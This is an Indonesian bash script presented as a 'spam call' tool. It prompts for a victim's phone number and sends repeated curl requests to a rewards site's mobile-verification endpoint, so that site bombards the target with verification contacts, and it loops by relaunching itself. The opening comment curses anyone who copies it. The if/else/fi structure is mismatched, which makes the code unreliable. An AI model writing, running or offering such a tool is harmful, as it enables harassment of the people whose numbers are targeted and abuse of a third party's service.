#yang recode gua do'ain lo mandul
#By MJN-ID-zero
#!/bin/bash
clear
echo
echo -e  "\033[32m ====================================================================>
sleep 0.5
figlet -tc -f ascii12 "JAN JUN"
sleep 2
toilet -f small -t "spam all for one"
sleep 2
echo -e  "\033[32m ====================================================================>
sleep 1
toilet -f big -F gay JAN spam c a l l
sleep 0.5
echo -e "\033[1;36m  click star on my github \033[0m"" = https://github.com/MJN-ID-zero"
echo
sleep 0.5
echo -e " \033[1;36m ==================================================================>
echo
sleep 2
echo -e "\033[1;31m note tools ini memiliki limit.\033[0m"
echo
sleep 1
echo -e "\033[1;36m masukan no dg awalan 8\033[0m"
echo
sleep 2
echo -e "\033[32m CONTOH : 81935××××××\033[0m"
echo -e "\033[1;33m JANGAN : 081935××××××\033[0m"
echo
read -p "nomor target  : " no;
curl -s https://id.jagreward.com/member/verify-mobile/$no/ > /dev/null 2>&1

if [ $? -eq 0 ];  then
sleep 3
toilet -f big -F gay succes
echo
echo "[+] DONE"
echo
sleep 4
bash gass.sh
fi
else
echo -e "\033[1;31m MASUKAN GENGAN BENAR\033[0m"
echo
sleep 1
echo -e "\033[1;31m MASUKAN GENGAN BENAR\033[0m"
echo
sleep 1
echo -e "\033[36m ATAU PERIKSA KONEKSI ANDA \033[0m"
sleep 2
echo
echo -e "\033[1;36m COBA LAGI OK\033[0m"
sleep 3
bash gass.sh
toilet -f big -F gay maaf sudah
echo
toilet -f big -F gay Limit
echo
echo "[×] error"
sleep 3
bash gas.sh
fi
